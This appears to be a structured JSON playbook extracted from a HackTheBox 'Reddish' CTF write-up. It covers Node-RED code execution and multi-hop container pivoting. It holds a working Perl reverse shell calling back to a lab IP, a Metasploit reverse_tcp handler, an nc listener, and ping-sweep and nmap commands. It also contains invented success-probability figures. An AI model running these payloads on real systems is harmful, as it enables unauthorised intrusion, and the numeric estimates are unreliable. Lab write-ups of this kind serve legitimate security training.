{
  "writeup_id": "Htb_Reddish",
  "scenario_fingerprint": {
    "scenario_name": "linux_container_pivot_chain",
    "primary_services": [
      "http",
      "nodejs"
    ],
    "port_signature": "1880",
    "service_combination": "nodejs+express",
    "os_family": "linux",
    "environment_type": "containerized_infrastructure",
    "entry_vector": "nodejs_application_rce",
    "privilege_path": "container_to_container_to_host",
    "attack_complexity": "insane",
    "estimated_time": "8-16 hours",
    "scenario_confidence": 0.92,
    "distinguishing_factors": [
      "node_red_editor_exposed",
      "multiple_container_layers",
      "network_tunneling_required",
      "minimal_toolset_environment"
    ],
    "environmental_clues": [
      "single_port_1880_open",
      "nodejs_express_framework",
      "post_request_reveals_path",
      "browser_based_flow_editor"
    ],
    "similar_scenarios": [
      "node_red_iot_platforms",
      "containerized_web_apps"
    ],
    "unique_aspects": [
      "flow_based_code_execution",
      "multi_hop_container_pivoting",
      "bare_bones_container_environment",
      "tcp_tunneling_through_containers"
    ]
  },
  "success_patterns": {
    "success_factors": [
      {
        "technique": "Node-Red Code Execution",
        "success_reason": "Node-Red editor exposed without authentication allowing arbitrary flow creation",
        "prerequisite_indicators": [
          "node_red_service_running",
          "port_1880_accessible",
          "no_authentication_required"
        ],
        "recognition_patterns": [
          "POST to root returns path with ID",
          "Node.js Express framework on port 1880",
          "Flow editor interface accessible"
        ],
        "failure_modes": [
          "authentication_enabled",
          "editor_disabled",
          "restricted_node_types"
        ],
        "environmental_factors": [
          "default_node_red_configuration",
          "development_environment",
          "insufficient_access_controls"
        ],
        "success_probability": 0.95,
        "typical_timeframe": "10-30 minutes"
      },
      {
        "technique": "Container Network Pivoting",
        "success_reason": "Multiple network interfaces revealed container environment with pivot opportunities",
        "prerequisite_indicators": [
          "container_environment_detected",
          "multiple_network_interfaces",
          "docker_bridge_networks"
        ],
        "recognition_patterns": [
          "eth0@if and eth1@if interface naming",
          "172.x.x.x private addressing",
          "missing standard linux tools"
        ],
        "failure_modes": [
          "isolated_container",
          "no_network_access",
          "strict_egress_filtering"
        ],
        "environmental_factors": [
          "docker_default_networking",
          "multi_container_architecture",
          "insufficient_network_segmentation"
        ],
        "success_probability": 0.78,
        "typical_timeframe": "15-45 minutes"
      }
    ],
    "critical_discoveries": [
      {
        "discovery": "Node-Red editor access via POST enumeration",
        "discovery_method": "POST request to root path revealing editor URL",
        "why_critical": "Provided direct code execution capability in container environment",
        "how_to_recognize": [
          "POST returns JSON with path containing ID",
          "Node.js Express framework detection",
          "Flow-based editor interface"
        ],
        "follow_up_actions": [
          "create_reverse_shell_flow",
          "establish_persistent_callback",
          "enumerate_container_environment"
        ]
      },
      {
        "discovery": "Container with multiple network interfaces",
        "discovery_method": "ip addr command revealing dual network connectivity",
        "why_critical": "Indicated pivot opportunities to other containers and potential host access",
        "how_to_recognize": [
          "172.18.0.2 and 172.19.0.3 addressing",
          "Docker bridge network patterns",
          "Minimal tool availability suggesting containerization"
        ],
        "follow_up_actions": [
          "enumerate_arp_cache",
          "scan_adjacent_networks",
          "establish_tunneling_infrastructure"
        ]
      }
    ],
    "escalation_keys": [
      {
        "privilege_level": "container_root",
        "escalation_method": "network_pivoting_to_adjacent_containers",
        "why_possible": "Root access in container with connectivity to multiple Docker networks",
        "recognition_signs": [
          "already_root_in_container",
          "multiple_bridge_networks_accessible",
          "arp_cache_showing_other_hosts"
        ],
        "exploitation_path": "Container Root → Network Enumeration → Adjacent Container Access → Host Escalation"
      }
    ]
  },
  "decision_tree": {
    "decision_points": [
      {
        "step": 1,
        "situation": "Single port 1880 open running Node.js Express framework",
        "decision": "Investigate Node-Red application for code execution opportunities",
        "reasoning": "Limited attack surface suggests focusing on the single exposed service",
        "confidence": 0.9,
        "alternatives": [
          {
            "option": "directory_bruteforce",
            "when": "if initial exploration fails"
          },
          {
            "option": "service_version_exploits",
            "when": "if specific version identified"
          }
        ],
        "success_indicators": [
          "node_red_editor_accessible",
          "flow_creation_possible",
          "exec_nodes_available"
        ],
        "next_decision": "exploit_node_red_functionality"
      },
      {
        "step": 2,
        "situation": "Node-Red editor accessible with exec nodes available",
        "decision": "Create malicious flow with exec node for command execution",
        "reasoning": "Exec nodes provide direct command execution capability",
        "confidence": 0.95,
        "prerequisites": [
          "node_red_editor_access",
          "exec_node_available"
        ],
        "success_indicators": [
          "command_execution_confirmed",
          "root_access_obtained"
        ],
        "failure_fallbacks": [
          "template_injection",
          "file_system_access"
        ]
      },
      {
        "step": 3,
        "situation": "Code execution achieved but in containerized environment",
        "decision": "Enumerate container network and pivot to other containers",
        "reasoning": "Container isolation requires lateral movement to reach host",
        "confidence": 0.85,
        "prerequisites": [
          "container_shell_access",
          "network_tools_available"
        ],
        "success_indicators": [
          "multiple_network_interfaces_found",
          "other_containers_discovered"
        ],
        "failure_fallbacks": [
          "container_escape_techniques",
          "host_enumeration"
        ]
      },
      {
        "step": 4,
        "situation": "Multiple containers discovered in different subnets",
        "decision": "Map network topology and identify pivot targets",
        "reasoning": "Understanding network layout essential for multi-hop pivoting",
        "confidence": 0.8,
        "prerequisites": [
          "network_enumeration_tools",
          "multiple_interfaces_identified"
        ],
        "success_indicators": [
          "network_map_created",
          "accessible_containers_identified"
        ],
        "failure_fallbacks": [
          "direct_host_access_attempts",
          "service_enumeration"
        ]
      }
    ],
    "branching_logic": {
      "if_node_red_accessible": {
        "action": "create_reverse_shell_flow",
        "tools": [
          "perl_reverse_shell",
          "exec_node"
        ],
        "next_phase": "container_enumeration"
      },
      "if_container_environment_detected": {
        "action": "network_discovery_and_pivoting",
        "alternatives": [
          "ping_sweep",
          "arp_enumeration",
          "port_scanning"
        ],
        "decision_criteria": "based_on_available_tools"
      },
      "if_multiple_containers_found": {
        "action": "systematic_container_compromise",
        "purpose": "establish_pivot_chain_to_host",
        "tools": [
          "static_nmap",
          "custom_tunneling"
        ]
      }
    },
    "optimization_rules": [
      {
        "rule": "always_check_for_containerization_early",
        "reasoning": "changes_entire_attack_strategy_and_tooling_needs",
        "applicability": "limited_system_tools_or_unusual_network_config"
      },
      {
        "rule": "upload_static_binaries_in_bare_environments",
        "reasoning": "essential_tools_often_missing_in_containers",
        "applicability": "minimal_linux_environments"
      },
      {
        "rule": "map_all_network_interfaces_in_containers",
        "reasoning": "containers_often_connected_to_multiple_networks",
        "applicability": "containerized_environments"
      }
    ]
  },
  "applicability_rules": {
    "technique_rules": [
      {
        "technique": "NodeRed_RCE",
        "mitre_id": "T1203",
        "required_services": [
          "http"
        ],
        "required_ports": [
          1880
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "node_red_service_running",
          "editor_interface_accessible",
          "exec_node_available"
        ],
        "success_indicators": [
          "node_red_editor_loads",
          "flow_deployment_succeeds",
          "exec_node_executes_commands"
        ],
        "incompatible_with": [
          "authentication_required",
          "exec_node_disabled",
          "network_isolation"
        ],
        "confidence_boosters": [
          "default_port_1880",
          "node_js_express_banner",
          "post_request_returns_path"
        ],
        "typical_success_rate": 0.95,
        "estimated_time": "10-20 minutes"
      },
      {
        "technique": "Container_Pivoting",
        "mitre_id": "T1021",
        "required_services": [
          "any"
        ],
        "required_ports": [],
        "os_requirements": [
          "linux"
        ],
        "environmental_prerequisites": [
          "containerized_environment",
          "network_connectivity_between_containers",
          "initial_foothold_established"
        ],
        "success_indicators": [
          "container_network_enumerated",
          "inter_container_communication_possible",
          "privilege_escalation_paths_identified"
        ],
        "incompatible_with": [
          "network_segmentation",
          "container_isolation_enforced",
          "no_network_tools_available"
        ],
        "confidence_boosters": [
          "docker_environment_detected",
          "multiple_network_interfaces",
          "container_specific_file_paths"
        ],
        "typical_success_rate": 0.75,
        "estimated_time": "30-60 minutes"
      },
      {
        "technique": "Perl_Reverse_Shell",
        "mitre_id": "T1059.006",
        "required_services": [],
        "required_ports": [],
        "os_requirements": [
          "linux",
          "unix"
        ],
        "environmental_prerequisites": [
          "perl_interpreter_available",
          "outbound_network_connectivity",
          "command_execution_capability"
        ],
        "success_indicators": [
          "perl_binary_exists",
          "socket_module_available",
          "reverse_connection_established"
        ],
        "incompatible_with": [
          "perl_not_installed",
          "outbound_connections_blocked",
          "restricted_shell_environment"
        ],
        "confidence_boosters": [
          "minimal_system_tools",
          "python_not_available",
          "unix_like_environment"
        ],
        "typical_success_rate": 0.85,
        "estimated_time": "5-10 minutes"
      }
    ],
    "environmental_detectors": {
      "node_red": {
        "port_indicators": [
          1880
        ],
        "service_indicators": [
          "http",
          "node.js"
        ],
        "banner_indicators": [
          "Node.js Express framework",
          "Cannot GET /"
        ],
        "confidence_threshold": 0.9
      },
      "containerized_environment": {
        "port_indicators": [],
        "service_indicators": [],
        "file_indicators": [
          "/.dockerenv",
          "/proc/1/cgroup"
        ],
        "confidence_threshold": 0.85
      },
      "minimal_linux": {
        "port_indicators": [],
        "service_indicators": [],
        "missing_tools": [
          "python",
          "python3",
          "nc",
          "netstat",
          "ifconfig"
        ],
        "confidence_threshold": 0.8
      }
    },
    "attack_prioritization": {
      "high_priority": [
        {
          "attack": "node_red_rce",
          "when": "port_1880_detected",
          "reason": "high_success_rate_immediate_rce"
        },
        {
          "attack": "perl_reverse_shell",
          "when": "minimal_environment_detected",
          "reason": "reliable_when_other_tools_unavailable"
        }
      ],
      "medium_priority": [
        {
          "attack": "container_pivoting",
          "when": "containerized_environment_detected",
          "reason": "complex_but_necessary_for_full_compromise"
        }
      ]
    }
  },
  "technique_intelligence": {
    "techniques": [
      {
        "name": "Node-RED Code Execution",
        "mitre_id": "T1203",
        "category": "execution",
        "phase": "initial_access",
        "tools_used": [
          {
            "name": "Node-RED Editor",
            "command_template": "POST to http://{target}:{port} to get editor path",
            "actual_command": "curl -X POST http://10.10.10.94:1880",
            "output_pattern": "{\"id\":\"{id}\",\"ip\":\"{ip}\",\"path\":\"/red/{id}\"}",
            "effectiveness_rating": 5,
            "reliability": 0.95
          },
          {
            "name": "Perl Reverse Shell",
            "command_template": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
            "actual_command": "perl -e 'use Socket;$i=\"10.10.14.14\";$p=9002;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
            "success_factors": [
              "perl_available",
              "network_connectivity"
            ],
            "effectiveness_rating": 5
          }
        ],
        "prerequisites": [
          "node_red_accessible",
          "editor_interface_available",
          "exec_node_available"
        ],
        "success_indicators": [
          "editor_interface_loads",
          "flows_can_be_deployed",
          "reverse_shell_established"
        ],
        "common_failures": [
          "authentication_required",
          "exec_node_disabled",
          "network_filtering"
        ],
        "follow_up_techniques": [
          "container_enumeration",
          "network_discovery",
          "privilege_escalation"
        ],
        "time_investment": "10-20 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "Container Network Discovery",
        "mitre_id": "T1018",
        "category": "discovery",
        "phase": "post_exploitation",
        "tools_used": [
          {
            "name": "ping sweep",
            "command_template": "for i in $(seq 1 254); do (ping -c 1 {network}.$i | grep \"bytes from\" | cut -d':' -f1 | cut -d' ' -f4 &); done",
            "actual_command": "for i in $(seq 1 254); do (ping -c 1 172.19.0.$i | grep \"bytes from\" | cut -d':' -f1 | cut -d' ' -f4 &); done",
            "output_pattern": "172.19.0.{host_ip}",
            "effectiveness_rating": 4,
            "reliability": 0.9
          },
          {
            "name": "arp table enumeration",
            "command_template": "cat /proc/net/arp",
            "actual_command": "cat /proc/net/arp",
            "success_factors": [
              "arp_cache_populated"
            ],
            "effectiveness_rating": 3
          },
          {
            "name": "static nmap",
            "command_template": "./nmap-static -p- -sT --min-rate 5000 {target}",
            "actual_command": "./nmap-static -p- -sT --min-rate 5000 172.18.0.1",
            "success_factors": [
              "static_binary_uploaded"
            ],
            "effectiveness_rating": 5
          }
        ],
        "prerequisites": [
          "container_shell_access",
          "network_interfaces_identified",
          "basic_tools_available"
        ],
        "success_indicators": [
          "additional_hosts_discovered",
          "network_topology_mapped",
          "services_identified"
        ],
        "common_failures": [
          "network_segmentation",
          "icmp_filtering",
          "limited_tools_available"
        ],
        "follow_up_techniques": [
          "port_scanning",
          "service_enumeration",
          "lateral_movement"
        ],
        "time_investment": "15-30 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "Metasploit Pivoting Setup",
        "mitre_id": "T1090",
        "category": "command_and_control",
        "phase": "post_exploitation",
        "tools_used": [
          {
            "name": "Metasploit Handler",
            "command_template": "use exploit/multi/handler; set payload linux/x64/shell/reverse_tcp; set LHOST {ip}; set LPORT {port}; run",
            "actual_command": "use exploit/multi/handler; set payload linux/x64/shell/reverse_tcp; set LHOST 10.10.14.14; set LPORT 9002; run",
            "output_pattern": "Command shell session {id} opened",
            "effectiveness_rating": 5,
            "reliability": 0.95
          },
          {
            "name": "Meterpreter Upgrade",
            "command_template": "sessions -u {session_id}",
            "actual_command": "sessions -u 1",
            "success_factors": [
              "compatible_architecture",
              "sufficient_privileges"
            ],
            "effectiveness_rating": 4
          }
        ],
        "prerequisites": [
          "reverse_shell_established",
          "metasploit_framework_available",
          "network_connectivity"
        ],
        "success_indicators": [
          "meterpreter_session_established",
          "portfwd_capability_available",
          "stable_c2_channel"
        ],
        "common_failures": [
          "architecture_mismatch",
          "insufficient_privileges",
          "av_detection"
        ],
        "follow_up_techniques": [
          "port_forwarding",
          "lateral_movement",
          "persistence"
        ],
        "time_investment": "5-15 minutes",
        "skill_level": "intermediate"
      }
    ],
    "tool_effectiveness": [
      {
        "tool": "Node-RED",
        "use_case": "initial_code_execution",
        "effectiveness_rating": 5,
        "reliability": 0.95,
        "learning_curve": "low",
        "essential_for": [
          "iot_environments",
          "node_js_applications"
        ],
        "alternatives": [
          "direct_api_exploitation",
          "web_shell_upload"
        ],
        "best_practices": [
          "explore_all_available_nodes",
          "create_reusable_flows",
          "test_exec_node_availability"
        ]
      },
      {
        "tool": "Static Binaries",
        "use_case": "tool_deployment_in_containers",
        "effectiveness_rating": 4,
        "reliability": 0.85,
        "learning_curve": "low",
        "essential_for": [
          "minimal_environments",
          "container_exploitation"
        ],
        "alternatives": [
          "compile_on_target",
          "use_built_in_tools"
        ],
        "best_practices": [
          "maintain_static_binary_collection",
          "verify_architecture_compatibility",
          "include_supporting_files"
        ]
      },
      {
        "tool": "Metasploit Pivoting",
        "use_case": "network_tunneling",
        "effectiveness_rating": 4,
        "reliability": 0.9,
        "learning_curve": "medium",
        "essential_for": [
          "multi_network_environments"
        ],
        "alternatives": [
          "ssh_tunneling",
          "custom_proxy_tools"
        ],
        "best_practices": [
          "upgrade_to_meterpreter_when_possible",
          "map_network_topology_first",
          "maintain_stable_sessions"
        ]
      }
    ],
    "command_sequences": [
      {
        "sequence_name": "node_red_to_shell",
        "steps": [
          {
            "step": 1,
            "command": "curl -X POST http://10.10.10.94:1880",
            "purpose": "Discover Node-RED editor path",
            "expected_output": "JSON with editor path"
          },
          {
            "step": 2,
            "command": "Navigate to /red/{id} in browser",
            "purpose": "Access Node-RED editor interface",
            "expected_output": "Node-RED flow editor loads"
          },
          {
            "step": 3,
            "command": "Create exec node with perl reverse shell",
            "purpose": "Establish code execution capability",
            "expected_output": "Flow deployed successfully"
          },
          {
            "step": 4,
            "command": "nc -lnvp 9002",
            "purpose": "Listen for reverse shell connection",
            "expected_output": "Shell as root in container"
          }
        ],
        "success_rate": 0.9,
        "typical_duration": "10-20 minutes"
      },
      {
        "sequence_name": "container_network_discovery",
        "steps": [
          {
            "step": 1,
            "command": "ip addr",
            "purpose": "Identify container network interfaces",
            "expected_output": "Multiple network interfaces with different subnets"
          },
          {
            "step": 2,
            "command": "cat /proc/net/arp",
            "purpose": "Discover gateway addresses",
            "expected_output": "ARP entries for .1 addresses"
          },
          {
            "step": 3,
            "command": "for i in $(seq 1 254); do (ping -c 1 172.19.0.$i | grep \"bytes from\" | cut -d':' -f1 | cut -d' ' -f4 &); done",
            "purpose": "Discover additional hosts in network",
            "expected_output": "List of responsive IP addresses"
          },
          {
            "step": 4,
            "command": "./nmap-static -p- -sT --min-rate 5000 [discovered_hosts]",
            "purpose": "Enumerate services on discovered hosts",
            "expected_output": "Open ports and services"
          }
        ],
        "success_rate": 0.85,
        "typical_duration": "20-30 minutes"
      }
    ]
  },
  "metadata": {
    "basic_metadata": {
      "name": "Reddish",
      "difficulty": "Insane",
      "os": "Linux",
      "platform": "HackTheBox",
      "release_date": "2018-07-21",
      "author": "yuntao",
      "estimated_time": "8-12 hours"
    },
    "intelligence_metadata": {
      "attack_complexity": "high",
      "skill_level_required": "advanced",
      "primary_attack_vectors": [
        "container_escape",
        "network_pivoting",
        "tunneling"
      ],
      "key_vulnerabilities": [
        "node_red_rce",
        "container_misconfigurations",
        "network_segmentation_bypass"
      ],
      "environment_type": "containerized_multi_network",
      "real_world_relevance": "very_high",
      "learning_value": [
        "container_security",
        "network_pivoting",
        "tunnel_management",
        "iot_exploitation"
      ],
      "prerequisite_knowledge": [
        "container_concepts",
        "network_fundamentals",
        "tunneling_techniques",
        "linux_privilege_escalation"
      ]
    },
    "categorization": {
      "primary_category": "container_security",
      "subcategories": [
        "network_pivoting",
        "iot_exploitation",
        "multi_stage_attack"
      ],
      "attack_types": [
        "initial_access",
        "lateral_movement",
        "privilege_escalation",
        "container_escape"
      ],
      "defensive_lessons": [
        "container_hardening",
        "network_segmentation",
        "iot_security",
        "monitoring_containerized_environments"
      ]
    },
    "similarity_markers": {
      "similar_boxes": [
        "Pivotapi",
        "Inception",
        "Enterprise"
      ],
      "similarity_reasons": [
        "multi_network_pivoting",
        "container_environments",
        "complex_attack_chains"
      ],
      "unique_aspects": [
        "node_red_exploitation",
        "bare_bones_container_environments",
        "multi_hop_tunneling"
      ],
      "difficulty_factors": [
        "multiple_network_segments",
        "limited_toolset",
        "complex_tunnel_management",
        "container_escape_requirements"
      ]
    }
  },
  "extraction_metadata": {
    "parse_date": "2025-07-04T20:03:07.907987",
    "original_file": "0xdf_writeups/Htb Reddish.md",
    "content_length": 47913,
    "extraction_version": "2.0-claude",
    "model_used": "claude-sonnet-4-20250514"
  },
  "intelligence_confidence": 0.9166666666666667,
  "quality_breakdown": {
    "scenario_uniqueness": 1.0,
    "success_logic_clarity": 0.6666666666666666,
    "applicability_completeness": 1.0,
    "decision_tree_depth": 1.0,
    "technique_actionability": 1.0
  }
}